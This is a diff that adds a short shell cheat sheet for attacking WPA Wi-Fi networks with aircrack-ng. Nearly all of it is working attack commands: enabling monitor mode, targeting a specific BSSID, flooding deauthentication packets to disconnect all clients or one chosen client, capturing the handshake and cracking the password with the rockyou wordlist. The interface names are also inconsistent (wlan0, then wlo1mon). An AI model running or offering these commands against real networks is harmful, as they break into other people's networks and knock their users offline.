@@ -1,0 +1,23 @@
+# Identify wireless interfaces
+sudo iwconfig
+
+# Enable monitor mode without stopping NetworkManager
+sudo airmon-ng start wlan0
+
+# Scan for networks
+sudo airodump-ng wlo1mon
+
+# Capture packets on target network
+sudo airodump-ng --bssid 7C:99:2E:12:EF:01 --channel 6 --write capture_file wlo1mon
+
+# Send deauth packets to disconnect all devices on the network
+sudo aireplay-ng --deauth 0 -a 7C:99:2E:12:EF:01 wlo1mon
+
+# Send deauth packets to disconnect a specific device
+sudo aireplay-ng --deauth 0 -a 7C:99:2E:12:EF:01 -c DA:A1:19:18:C4:0E wlo1mon
+
+# Verify the captured WPA handshake
+aircrack-ng capture_file-01.cap
+
+# Attempt to crack the WPA password with a wordlist
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_file-01.cap
